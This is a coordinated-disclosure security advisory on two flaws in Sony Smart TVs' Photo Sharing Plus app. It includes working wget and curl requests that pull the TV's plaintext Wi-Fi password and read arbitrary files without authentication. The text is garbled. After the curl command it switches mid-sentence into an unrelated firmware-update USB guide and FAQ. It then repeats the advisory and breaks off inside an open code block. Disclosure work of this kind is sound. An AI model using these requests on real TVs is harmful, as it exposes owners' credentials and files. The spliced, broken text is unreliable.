TITLE: Multiple vulnerabilities in Sony Smart TVs
ADVISORY URL:
<https://www.darkmatter.ae/blogs/security-flaws-uncovered-in-sony-smart-tvs/>
DATE PUBLISHED: 23/04/2019
AFFECTED VENDORS: Sony
RELEASE MODE: Coordinated release
CVE: CVE-2019-10886, CVE-2019-11336
CVSSv3 for CVE-2019-10886: 6.5 (AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
CVSSv3 for CVE-2019-11336: 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

## PRODUCT DESCRIPTION

Sony Smart TVs are provided with applications - adding more functionalities
for the customers - including the "Photo Sharing Plus" application.

The "Photo Sharing Plus" application running inside the Smart TV contains
several weaknesses. This application allows uploading pictures from Smartphone
to the TVs, in order to display them on a large screen.
When started, Photo Sharing Plus is turning the TV into a Wi-Fi access point
and shows a Wi-Fi password allowing customers to connect and share their media
content on the Sony Smart TVs.

## DETAILS OF VULNERABILITIES

xen1thLabs has found multiple vulnerabilities in Sony products in October 2018
and xen1thLabs coordinated the disclosure of these vulnerabilities with Sony.
Two vulnerabilities have been found in the Sony Smart TVs by xen1thLabs while
auditing the security of Smart TVs.
The first vulnerability allows an attacker - without authentication from the
LAN/Wi-Fi - to retrieve the static Wi-Fi password created by the television
when the Photo Sharing Plus application is started.
The second vulnerability allows an attacker to read arbitrary files located in
the TV without authentication including valuable files.

The summary of the vulnerabilities is:

- CVE-2019-10886 Sony Smart TV Photo Sharing Plus Arbitrary File Read
Vulnerability
- CVE-2019-11336 Sony Smart TV Photo Sharing Plus Information Disclosure
Vulnerability

The number of affected Sony models is very high and Sony has decided to remove
this vulnerable application from all models
(<https://www.sony.com/electronics/support/televisions-projectors/articles/00204331>).

Sony provided a non-exhaustive list of affected TV models from 2015-2016.

### 1. CVE-2019-11336 Sony Smart TV Photo Sharing Plus Information Disclosure
Vulnerability

An unauthenticated remote attacker can retrieve the plaintext wireless password
through the "Photo Sharing Plus" API.

After starting the application, the following example retrieves the wireless
password created from the TV (IP address of the TV is 192.168.1.102) over the
LAN, without authentication:

```
root@kali:~# wget -qO- --post-data='{"id":80,"method":"getContentShareServerInfo","params":[],"version":"1.0"}'
http://[ip_tv]:10000/contentshare/
{"result":[{"ssid":"DIRECT-GD-BRAVIA","keyType":"","key":"8362tbwX","deviceName":"","url":"http:\/\/192.168.49.1","touchPadRemote":"notSupported"}],"id":80}
````

The password is 8362tbwX.

By reading logs of the TV, we can confirm the password has been delivered over
HTTP, without authentication. The logs contain password in plain-text:

```
01-01 07:47:23.730 5539 18687 I System.out: [MEXI][D] HttpEndPoint: send:
{"result":[{"ssid":"DIRECT-GD-BRAVIA","keyType":"","key":"8362tbwX","deviceName":"","url":"http:\/\/192.168.49.1","touchPadRemote":"notSupported"}],"id":80}
````

It is also important to note that the generated Wireless password by the TV is
always the same. Even after a hard reboot and a disconnection from the power
supply, the generated password will be always the same. This lack of randomness
is also a security issue.

### 2. CVE-2019-10886 Sony Smart TV Photo Sharing Plus Arbitrary File Read
Vulnerability

It is possible to retrieve internal TV files over HTTP without authentication.

By default, images used by the Photo Sharing Plus application are stored inside
`/data/user/0/com.sony.dtv.photosharingplus/files/_BRAVPSS.TMP/`.
The application starts an access point on the television and a HTTP daemon is
listening to a TCP port on this WLAN.
Furthermore, this daemon also listens on the LAN side of the television and it
is possible to retrieve these images from the LAN an image using this URL:

http://[ip_tv]:10000/contentshare/image/data/user/0/com.sony.dtv.photosharingplus/files/_BRAVPSS.TMP/LJYT0010.JPG

Browsing the address http://[ip_tv]:10000/contentshare/image/ allows getting
access to the root directory of the television running Android.

By exploiting this vulnerability, /default.prop (containing Android properties)
can be retrieved via [http://192.168.1.102:10000/contentshare/image/default.prop:](http://192.168.1.102:10000/contentshare/image/default.prop%3A)

```
root@kali:~# curl -v <http://192.168.1.102:10000/contentshare/image/default.prop>

Logs in the TV confirm the /default.prop file has been delivered over HTTP:

    **Note:**  After you extract the downloaded file, you will find a file (**sony\_dtv**xxxxx\_xxxx\_xxxxxx**.pkg**).
5. Insert the USB flash drive into your computer.
6. Go to the location where you saved the extracted file and copy, or drag and drop that file to the root directory of your USB device.
    **Note:**  The **root directory** is the first or top-most directory of the device, which contains all the other folders.
7. Remove the USB flash drive from your computer and continue to the next section.

### Step 1: Install the update

Once you've downloaded the update file and prepared your USB device, you can install it on your TV. The process can take up to 30 minutes and during the installation, your TV will turn off before turning itself back on. Follow these steps:

1. Turn on the TV.
2. Make sure that no other USB devices are inserted into your TV.
3. Insert the USB flash drive containing the extracted file (**sony\_dtv**xxxxx\_xxxx\_xxxxxx**.pkg**) into a USB port of the TV set.
    **Note:**  If the TV has multiple USB ports, any of the USB slots can be used.
4. Once the USB flash drive has been detected, a series of different messages will appear on the TV set. Follow the on-screen instructions.
    **Note:**  If the messages do not appear automatically, use the remote control to turn the TV off and back on again.
5. When the file is finished copying from the USB flash drive, the update process will begin, the **POWER** indicator on the TV will begin flashing white, and the update progress screen is displayed on the TV.
6. After several minutes, the TV will turn off and then turn back on to complete the update.
    **WARNING! During the software installation process:**
   * **Do not remove the USB device**
   * **Do not turn off the TV**
   * **Do not disconnect the TV from the power supply**
7. When the software update is complete, a message appears on the TV indicating the software update is complete.
8. Carefully remove the USB device from the USB slot.

### Step 2: Check that the update was successful

[Check the current software version](#check) to confirm that the update has successfully been installed.

* If the version number is **PKG6.7220.xxxx**, the software update was successful.
* If the version number isn't **PKG6.7220.xxxx**, download and install the update again.

## Questions & Answers

### FAQs

* **Will my personal settings be deleted after the update?**
   No, all your personal settings will be kept.
* **Can I install an older version of the software?**
   No. To ensure that your TV remains at optimum performance, the installation of an older software version is not possible. The latest software version contains all the benefits and improvements of previous versions.
* **Is it normal for the TV to turn off during the update process?**
   Yes, it's normal for the TV to restart during the update process. It will take longer for the TV to restart while installing the new software.

### What to do if you have problems updating your TV firmware

If either message **An error occurred during the software update** or **Software cannot be updated using this USB device** is displayed on the TV screen, please proceed to the following procedures for a possible solution:

1. Turn off the TV by pressing the **POWER** button on the TV set.
2. Press the **POWER** button again and proceed with the installation process again.

If the message **No newer version of the TV software was found** is displayed on the TV screen, your TV already has the newest software version installed, so you don't need to update it.

**Note:**  If you are trying to update the software using a USB flash drive, check the following.

* Make sure your USB flash drive is in good working order.
* The drive must be formatted in **FAT16**, **FAT32**, **exFAT**, or **NTFS**.
* The update can fail even when using a USB flash drive that meets the above conditions, depending on the size and directory structure of other files on the drive. If the update does fail, delete other files and try again with only the update file saved in the USB flash drive. If the update still fails, format the USB flash drive to **FAT32** and try again.

## ADVISORY INFORMATION

TITLE: Multiple vulnerabilities in Sony Smart TVs
ADVISORY URL:
<https://www.darkmatter.ae/blogs/security-flaws-uncovered-in-sony-smart-tvs/>
DATE PUBLISHED: 23/04/2019
AFFECTED VENDORS: Sony
RELEASE MODE: Coordinated release
CVE: CVE-2019-10886, CVE-2019-11336
CVSSv3 for CVE-2019-10886: 6.5 (AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
CVSSv3 for CVE-2019-11336: 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

## PRODUCT DESCRIPTION

Sony Smart TVs are provided with applications - adding more functionalities
for the customers - including the "Photo Sharing Plus" application.

The "Photo Sharing Plus" application running inside the Smart TV contains
several weaknesses. This application allows uploading pictures from Smartphone
to the TVs, in order to display them on a large screen.
When started, Photo Sharing Plus is turning the TV into a Wi-Fi access point
and shows a Wi-Fi password allowing customers to connect and share their media
content on the Sony Smart TVs.

## DETAILS OF VULNERABILITIES

xen1thLabs has found multiple vulnerabilities in Sony products in October 2018
and xen1thLabs coordinated the disclosure of these vulnerabilities with Sony.
Two vulnerabilities have been found in the Sony Smart TVs by xen1thLabs while
auditing the security of Smart TVs.
The first vulnerability allows an attacker - without authentication from the
LAN/Wi-Fi - to retrieve the static Wi-Fi password created by the television
when the Photo Sharing Plus application is started.
The second vulnerability allows an attacker to read arbitrary files located in
the TV without authentication including valuable files.

The summary of the vulnerabilities is:

- CVE-2019-10886 Sony Smart TV Photo Sharing Plus Arbitrary File Read
Vulnerability
- CVE-2019-11336 Sony Smart TV Photo Sharing Plus Information Disclosure
Vulnerability

The number of affected Sony models is very high and Sony has decided to remove
this vulnerable application from all models
(<https://www.sony.com/electronics/support/televisions-projectors/articles/00204331>).

Sony provided a non-exhaustive list of affected TV models from 2015-2016.

### 1. CVE-2019-11336 Sony Smart TV Photo Sharing Plus Information Disclosure
Vulnerability

An unauthenticated remote attacker can retrieve the plaintext wireless password
through the "Photo Sharing Plus" API.

After starting the application, the following example retrieves the wireless
password created from the TV (IP address of the TV is 192.168.1.102) over the
LAN, without authentication:

```
root@kali:~# wget -qO- --post-data='{"id":80,"method":"getContentShareServerInfo","params":[],"version":"1.0"}'
http://[ip_tv]:10000/contentshare/
{"result":[{"ssid":"DIRECT-GD-BRAVIA","keyType":"","key":"8362tbwX","deviceName":"","url":"http:\/\/192.168.49.1","touchPadRemote":"notSupported"}],"id":80}
````

The password is 8362tbwX.

By reading logs of the TV, we can confirm the password has been delivered over
HTTP, without authentication. The logs contain password in plain-text:

```
01-01 07:47:23.730 5539 18687 I System.out: [MEXI][D] HttpEndPoint: send:
{"result":[{"ssid":"DIRECT-GD-BRAVIA","keyType":"","key":"8362tbwX","deviceName":"","url":"http:\/\/192.168.49.1","touchPadRemote":"notSupported"}],"id":80}
````

It is also important to note that the generated Wireless password by the TV is
always the same. Even after a hard reboot and a disconnection from the power
supply, the generated password will be always the same. This lack of randomness
is also a security issue.

### 2. CVE-2019-10886 Sony Smart TV Photo Sharing Plus Arbitrary File Read
Vulnerability

It is possible to retrieve internal TV files over HTTP without authentication.

By default, images used by the Photo Sharing Plus application are stored inside
`/data/user/0/com.sony.dtv.photosharingplus/files/_BRAVPSS.TMP/`.
The application starts an access point on the television and a HTTP daemon is
listening to a TCP port on this WLAN.
Furthermore, this daemon also listens on the LAN side of the television and it
is possible to retrieve these images from the LAN an image using this URL:

http://[ip_tv]:10000/contentshare/image/data/user/0/com.sony.dtv.photosharingplus/files/_BRAVPSS.TMP/LJYT0010.JPG

Browsing the address http://[ip_tv]:10000/contentshare/image/ allows getting
access to the root directory of the television running Android.

By exploiting this vulnerability, /default.prop (containing Android properties)
can be retrieved via [http://192.168.1.102:10000/contentshare/image/default.prop:](http://192.168.1.102:10000/contentshare/image/default.prop%3A)

```
